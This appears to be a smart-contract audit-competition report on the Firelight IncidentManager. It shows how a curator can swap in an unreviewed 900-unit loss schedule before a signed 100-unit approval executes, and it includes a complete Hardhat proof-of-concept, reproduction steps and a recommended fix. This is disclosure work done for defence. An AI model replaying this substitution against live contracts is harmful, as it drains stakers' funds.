# 88618 sc high assessment approval can execute a replacement loss schedule the risk consortium never reviewed

**Submitted on Aug 14th 2026 at 07:17:12 UTC by @Tradi3 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88618
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/IncidentManager.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`approveCurrentAssessment(uint256 incidentId)` identifies the incident but not the assessment round or loss schedule reviewed by the Risk Consortium.

After the consortium signs an approval for round N, the curator can cancel that round, create and submit round N+1 with a different loss schedule, and then execute the unchanged approval. The contract resolves `currentAssessmentRoundId` at execution, so the signature approves and pays the replacement schedule.

The curator does not need the consortium to collude, approve without review, or sign new calldata. The PoC has separate curator and approver accounts, signs the approval before replacement, and broadcasts the same signed transaction afterward.

## Root cause

The approver's calldata contains only `incidentId`:

```solidity
function approveCurrentAssessment(uint256 incidentId)
    external
    onlyRole(ASSESSMENT_APPROVER_ROLE)
    nonReentrant
{
    Incident storage incident =
        _activeIncidentWithStatus(incidentId, IncidentStatus.UNDER_EVALUATION);

    // ... FIFO check ...

    (uint256 assessmentRoundId, AssessmentRound storage assessmentRound) =
        _setCurrentAssessmentStatus(
            incidentId,
            incident,
            AssessmentRoundStatus.UNDER_EVALUATION,
            AssessmentRoundStatus.APPROVED
        );

    _executePayout(/* ... */, assessmentRound.totalAssessmentLoss);
}
```

`_setCurrentAssessmentStatus()` reads the mutable pointer at execution:

```solidity
assessmentRoundId = incident.currentAssessmentRoundId;
assessmentRound = $.assessmentRounds[incidentId][assessmentRoundId];
```

Meanwhile, `CURATOR_ROLE` may cancel a submitted round. The next call to `addAssessmentLosses()` increments `currentAssessmentRoundId`, builds a new draft, and `submitCurrentAssessment()` makes it approvable.

Nothing in the signed call commits to the round the consortium reviewed.

## Attack sequence

{% stepper %}
{% step %}

### Create and submit round 1

The curator creates incident 1, adds a 100-unit schedule to round 1, and submits it.
{% endstep %}

{% step %}

### Review and sign approval

The Risk Consortium reviews round 1 and signs:

```
approveCurrentAssessment(1)
calldata:
0x62c1f4cb0000000000000000000000000000000000000000000000000000000000000001
keccak256(calldata):
0xa03e65d549200dd74f5997f2e04fcbbb2c26b4967c18158bb0aefafc567c7503
```

{% endstep %}

{% step %}

### Cancel the reviewed assessment

Before execution, the curator calls `cancelCurrentAssessment(1)`.
{% endstep %}

{% step %}

### Create a replacement schedule

The curator adds a new 900-unit schedule. This opens round 2.
{% endstep %}

{% step %}

### Submit round 2

The curator calls `submitCurrentAssessment(1)`.
{% endstep %}

{% step %}

### Execute the original approval

The original signed transaction is broadcast unchanged.
{% endstep %}

{% step %}

### Pay the replacement schedule

`approveCurrentAssessment(1)` reads `currentAssessmentRoundId == 2` and pays 900 units.
{% endstep %}
{% endstepper %}

The cancellation and replacement can be completed after the Safe transaction reaches its signature threshold but before execution. Safe signatures bind the target and transaction data, not the target contract's storage. Because the data contains only `incidentId`, the Safe cannot commit to the reviewed round. This follows the [Safe v1.4.1 transaction hash construction](https://github.com/safe-global/safe-smart-account/blob/v1.4.1/contracts/Safe.sol), which commits to the call data and Safe execution fields but cannot bind a round absent from that data.

## Impact

The production-vault PoC starts with one staker holding 1,000 units of redeemable principal. The consortium reviews a 100-unit assessment. The replacement schedule pays 900 units from the real `FirelightVault`:

```
vault totalAssets:                    1,000 -> 100
staker convertToAssets(all shares):  1,000 -> 100
payout receiver gain:                         900
excess over reviewed schedule:                800
```

This destroys 90% of the staker's redeemable principal even though the independent payout authority approved only the 100-unit schedule. A replacement schedule can consume the vault collateral backing outstanding cover and leave the protocol unable to honor those obligations.

## Why this is a protocol-constraint bypass

The disclosed role model gives the curator authority to propose incidents and loss schedules. It gives the Risk Consortium separate authority to validate that schedule and approve the payout. The published audit calls the consortium the primary on-chain check and its independence from the curator the most important assumption in the claim flow.

This report does not rely on the consortium approving a fabricated or excessive schedule. It reviews and signs the 100-unit schedule correctly. The defect lets the curator change the meaning of that existing approval and execute a different 900-unit schedule without further consortium authorization.

That exceeds the curator's proposal authority by bypassing the independent approval constraint.

## Known-issue and grouping check

The disclosed aggregate-claims issue concerns the absence of a cross-incident `remainingCoverage` cap. This issue is different:

* the root cause is missing round identity in approval calldata;
* the replacement round uses a separate, valid 900-unit allocation;
* the consortium never reviewed the executed schedule;
* a `remainingCoverage` decrement does not bind an approval to a round;
* the minimal fix is approval-state binding, not coverage accounting.

The published audit, contest known issues, repository history, issues, and pull-request discussions do not disclose this round-substitution path.

## Recommended fix

Bind approval and rejection to the reviewed round:

```solidity
function approveCurrentAssessment(
    uint256 incidentId,
    uint256 expectedAssessmentRoundId
) external onlyRole(ASSESSMENT_APPROVER_ROLE) nonReentrant {
    Incident storage incident = _activeIncidentWithStatus(
        incidentId,
        IncidentStatus.UNDER_EVALUATION
    );

    if (incident.currentAssessmentRoundId != expectedAssessmentRoundId) {
        revert AssessmentRoundChanged(
            expectedAssessmentRoundId,
            incident.currentAssessmentRoundId
        );
    }

    // existing approval flow
}
```

Apply the same binding to `rejectCurrentAssessment()`.

Round ID is sufficient because assessment losses cannot be changed while a round is `UNDER_EVALUATION`; changing the schedule requires canceling/rejecting it and opening a new round. A schedule hash would also work but is not necessary.

## Link to Proof of Concept

<https://gist.github.com/krutftw/cea459673576c9cc4f99d996057e3031>

## Proof of Concept

**Target commit:** `42f9ea5e43d88b35197b901acc2a8c24b314fa62` (`v1_audit_ready`)

### Steps to reproduce

{% stepper %}
{% step %}

### Check out the target commit

{% endstep %}

{% step %}

### Save the test file

Save the complete test below as `test/PoC_AssessmentRoundSwap.js`.
{% endstep %}

{% step %}

### Run the test

From the repository root, run:

```bash
npx hardhat test test/PoC_AssessmentRoundSwap.js test/incidentManager/IncidentManager.test.js --no-compile
```

{% endstep %}
{% endstepper %}

### Expected terminal result

```
reviewed payout: 100000000
executed replacement payout: 900000000
real vault staker assets: 1000000000 -> 100000000
unreviewed excess slash over 100-unit schedule: 800000000
107 passing
```

The first case is a control showing that round 1 pays the reviewed 100-unit schedule. The second signs `approveCurrentAssessment(1)`, replaces round 1 with a 900-unit round, and broadcasts the unchanged signed transaction. The third repeats the path against the production `FirelightVault` fixture and proves the staker's redeemable principal falls from 1,000 to 100.

**PoC SHA-256:** `EB31EFB7D93A8FBBC09584CA2954BDB7CBD0E828B32FFD87E6CB3FCD381D1510`

### Complete test

```javascript
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures')

const {
  deployIncidentManager,
  AssessmentRoundStatus,
  IncidentStatus,
} = require('./incidentManager/fixtures')

const fundedWallet = async () => {
  const wallet = ethers.Wallet.createRandom().connect(ethers.provider)
  await ethers.provider.send('hardhat_setBalance', [wallet.address, '0x3635C9ADC5DEA00000'])
  return wallet
}

describe('PoC: an approval is not bound to the reviewed assessment round', function () {
  this.timeout(240_000)

  async function preparedRoundOne() {
    const ctx = await deployIncidentManager()
    const unit = 10n ** 18n

    await ctx.setOrderMarket(1, ctx.marketIdA, 100n * unit, ctx.payoutRecipient1.address)
    await ctx.setOrderMarket(2, ctx.marketIdA, 900n * unit, ctx.payoutRecipient2.address)

    await ctx.incidentManager
      .connect(ctx.curator)
      .createIncident(ctx.DEFAULT_CAPTURE_TIMESTAMP, 'Round-binding incident', ctx.refOf('round-binding'))
    await ctx.incidentManager.connect(ctx.curator).confirmIncident(1, 'ipfs://reviewed-report')
    await ctx.incidentManager
      .connect(ctx.curator)
      .addAssessmentLosses(1, [ctx.lossOf(1, ctx.marketIdA, 100n * unit)])
    await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1)

    return { ...ctx, unit }
  }

  it('control: the reviewed first round pays its reviewed 100-unit schedule', async function () {
    const ctx = await loadFixture(preparedRoundOne)
    await ctx.fundFlb(1_000n * 10n ** 6n)

    const before = await ctx.firstLossBufferToken.balanceOf(ctx.payoutReceiver.address)
    await ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1)
    const after = await ctx.firstLossBufferToken.balanceOf(ctx.payoutReceiver.address)

    expect(after - before).to.equal(100n * 10n ** 6n)
    expect((await ctx.incidentManager.getIncident(1))[0].status).to.equal(IncidentStatus.CLOSED)
  })

  it('the curator can swap in a 900-unit round while the approver calldata stays identical', async function () {
    const ctx = await loadFixture(preparedRoundOne)

    // This is all the approver can bind into a queued/signed transaction.
    const reviewedApproval = await ctx.incidentManager
      .connect(ctx.assessmentApprover)
      .approveCurrentAssessment.populateTransaction(1)
    const reviewedApprovalHash = ethers.keccak256(reviewedApproval.data)
    expect(reviewedApproval.data).to.equal(
      '0x62c1f4cb0000000000000000000000000000000000000000000000000000000000000001',
    )
    expect(reviewedApprovalHash).to.equal(
      '0xa03e65d549200dd74f5997f2e04fcbbb2c26b4967c18158bb0aefafc567c7503',
    )
    const network = await ethers.provider.getNetwork()
    const signedApproval = await ctx.assessmentApprover.signTransaction({
      to: ctx.incidentManager.target,
      data: reviewedApproval.data,
      nonce: await ethers.provider.getTransactionCount(ctx.assessmentApprover.address),
      chainId: network.chainId,
      gasLimit: 2_000_000n,
      maxFeePerGas: ethers.parseUnits('100', 'gwei'),
      maxPriorityFeePerGas: ethers.parseUnits('1', 'gwei'),
      type: 2,
    })
    const signedApprovalTransactionHash = ethers.keccak256(signedApproval)
    console.log(`    reviewed approval calldata: ${reviewedApproval.data}`)
    console.log(`    reviewed approval calldata hash: ${reviewedApprovalHash}`)
    console.log(`    reviewed signed transaction hash: ${signedApprovalTransactionHash}`)

    // Before that approval executes, the curator replaces the reviewed round.
    await ctx.incidentManager.connect(ctx.curator).cancelCurrentAssessment(1)
    await ctx.incidentManager
      .connect(ctx.curator)
      .addAssessmentLosses(1, [ctx.lossOf(2, ctx.marketIdA, 900n * ctx.unit)])
    await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1)

    const replacementApproval = await ctx.incidentManager
      .connect(ctx.assessmentApprover)
      .approveCurrentAssessment.populateTransaction(1)

    // The signed call does not identify round 1, its schedule, or a schedule hash.
    expect(replacementApproval.data).to.equal(reviewedApproval.data)
    expect(ethers.keccak256(replacementApproval.data)).to.equal(reviewedApprovalHash)

    const [roundOne] = await ctx.incidentManager.getAssessmentRound(1, 1)
    const [roundTwo] = await ctx.incidentManager.getAssessmentRound(1, 2)
    expect(roundOne.status).to.equal(AssessmentRoundStatus.CANCELED)
    expect(roundTwo.status).to.equal(AssessmentRoundStatus.UNDER_EVALUATION)
    expect(roundTwo.totalAssessmentLoss).to.equal(900n * ctx.unit)

    await ctx.fundFlb(1_000n * 10n ** 6n)
    const before = await ctx.firstLossBufferToken.balanceOf(ctx.payoutReceiver.address)

    // The original calldata now approves and executes the unreviewed replacement round.
    const broadcast = await ethers.provider.broadcastTransaction(signedApproval)
    expect(broadcast.hash).to.equal(signedApprovalTransactionHash)
    await broadcast.wait()

    const after = await ctx.firstLossBufferToken.balanceOf(ctx.payoutReceiver.address)
    expect(after - before).to.equal(900n * 10n ** 6n)
    console.log(`    reviewed payout: 100000000; executed replacement payout: ${after - before}`)
    const [approvedRoundTwo] = await ctx.incidentManager.getAssessmentRound(1, 2)
    expect(approvedRoundTwo.status).to.equal(
      AssessmentRoundStatus.APPROVED,
    )
    expect((await ctx.incidentManager.getIncident(1))[0].status).to.equal(IncidentStatus.CLOSED)
  })

  it('the unchanged signed approval slashes 900 units from real FirelightVault staker assets', async function () {
    const vaultCtx = await deployVault({
      decimals: 6,
      initial_deposit_limit: ethers.parseUnits('2000', 6),
      period_configuration_duration: 24 * 60 * 60,
    })
    const [deployer, , , assessmentRejecter, incidentInvalidator, firstLossBuffer] = await ethers.getSigners()
    const curator = await fundedWallet()
    const assessmentApprover = await fundedWallet()
    const staker = vaultCtx.users[0]
    const unit = 10n ** 18n
    const vaultUnit = 10n ** 6n

    // Deposit in period 0, then move into period 1 so the full deposit is in the
    // production vault's period-start exposure checkpoint.
    await vaultCtx.utils.mintAndApprove(1_000n * vaultUnit, staker)
    await vaultCtx.firelight_vault.connect(staker).deposit(1_000n * vaultUnit, staker.address)
    await time.increase(24 * 60 * 60 + 1)

    const captureTimestamp = await time.latest()
    const incidentPeriod = await vaultCtx.firelight_vault.currentPeriod()
    const periodStart = await vaultCtx.firelight_vault.currentPeriodStart()
    expect(await vaultCtx.firelight_vault.totalAssetsAt(periodStart)).to.equal(1_000n * vaultUnit)

    const MockERC20 = await ethers.getContractFactory('MockERC20')
    const firstLossBufferToken = await MockERC20.deploy('MockUSDC', 'mUSDC', 6)
    const MockAllocator = await ethers.getContractFactory('MockIncidentManagerCoverOrderAllocator')
    const allocator = await MockAllocator.deploy()
    await allocator.setVault(vaultCtx.firelight_vault.target)
    await allocator.setCanonicalDecimals(18)
    await allocator.setMockCapacityConfig({
      minCAR: 10_000,
      firstLossBufferToken: firstLossBufferToken.target,
      firstLossBuffer: firstLossBuffer.address,
      effectiveLeverage: 20_000,
      minOrderMarketCoverAmount: 1,
      divergenceToleranceBps: 0,
    })

    const marketId = ethers.id('real-vault-market')
    await allocator.setOrderMarket(
      1,
      marketId,
      incidentPeriod,
      100n * unit,
      vaultCtx.users[1].address,
    )
    await allocator.setOrderMarket(
      2,
      marketId,
      incidentPeriod,
      900n * unit,
      vaultCtx.users[2].address,
    )

    const MockPriceFeed = await ethers.getContractFactory('MockPriceFeed')
    const priceFeed = await MockPriceFeed.deploy(8, 10n ** 8n)
    const IncidentManagerFactory = await ethers.getContractFactory('IncidentManager')
    const incidentManager = await upgrades.deployProxy(
      IncidentManagerFactory,
      [
        deployer.address,
        curator.address,
        assessmentApprover.address,
        assessmentRejecter.address,
        incidentInvalidator.address,
        deployer.address,
        deployer.address,
        deployer.address,
        vaultCtx.payout_receiver.address,
        allocator.target,
        priceFeed.target,
        3600,
      ],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
    )

    await vaultCtx.firelight_vault
      .connect(deployer)
      .grantRole(await vaultCtx.firelight_vault.PAYOUT_ROLE(), incidentManager.target)
    await vaultCtx.firelight_vault
      .connect(deployer)
      .grantRole(await vaultCtx.firelight_vault.INCIDENT_ROLE(), incidentManager.target)

    await incidentManager
      .connect(curator)
      .createIncident(captureTimestamp, 'Real-vault round-binding incident', ethers.id('real-vault-round-binding'))
    await incidentManager.connect(curator).confirmIncident(1, 'ipfs://reviewed-real-vault-report')
    await incidentManager
      .connect(curator)
      .addAssessmentLosses(1, [{ coverTokenId: 1, marketId, amount: 100n * unit }])
    await incidentManager.connect(curator).submitCurrentAssessment(1)

    const reviewedApproval = await incidentManager
      .connect(assessmentApprover)
      .approveCurrentAssessment.populateTransaction(1)
    const network = await ethers.provider.getNetwork()
    const signedApproval = await assessmentApprover.signTransaction({
      to: incidentManager.target,
      data: reviewedApproval.data,
      nonce: await ethers.provider.getTransactionCount(assessmentApprover.address),
      chainId: network.chainId,
      gasLimit: 2_000_000n,
      maxFeePerGas: ethers.parseUnits('100', 'gwei'),
      maxPriorityFeePerGas: ethers.parseUnits('1', 'gwei'),
      type: 2,
    })

    await incidentManager.connect(curator).cancelCurrentAssessment(1)
    await incidentManager
      .connect(curator)
      .addAssessmentLosses(1, [{ coverTokenId: 2, marketId, amount: 900n * unit }])
    await incidentManager.connect(curator).submitCurrentAssessment(1)

    const stakerShares = await vaultCtx.firelight_vault.balanceOf(staker.address)
    const stakerAssetsBefore = await vaultCtx.firelight_vault.convertToAssets(stakerShares)
    const vaultAssetsBefore = await vaultCtx.firelight_vault.totalAssets()
    const receiverBefore = await vaultCtx.token_contract.balanceOf(vaultCtx.payout_receiver.address)

    const broadcast = await ethers.provider.broadcastTransaction(signedApproval)
    await broadcast.wait()

    const stakerAssetsAfter = await vaultCtx.firelight_vault.convertToAssets(stakerShares)
    const vaultAssetsAfter = await vaultCtx.firelight_vault.totalAssets()
    const receiverAfter = await vaultCtx.token_contract.balanceOf(vaultCtx.payout_receiver.address)
    const [closedIncident] = await incidentManager.getIncident(1)

    expect(vaultAssetsBefore).to.equal(1_000n * vaultUnit)
    expect(vaultAssetsBefore - vaultAssetsAfter).to.equal(900n * vaultUnit)
    expect(stakerAssetsBefore - stakerAssetsAfter).to.equal(900n * vaultUnit)
    expect(receiverAfter - receiverBefore).to.equal(900n * vaultUnit)
    expect(closedIncident.vaultPaidAmount).to.equal(900n * vaultUnit)
    console.log(
      `    real vault staker assets: ${stakerAssetsBefore} -> ${stakerAssetsAfter}; ` +
        `unreviewed excess slash over 100-unit schedule: ${800n * vaultUnit}`,
    )
  })
})
```
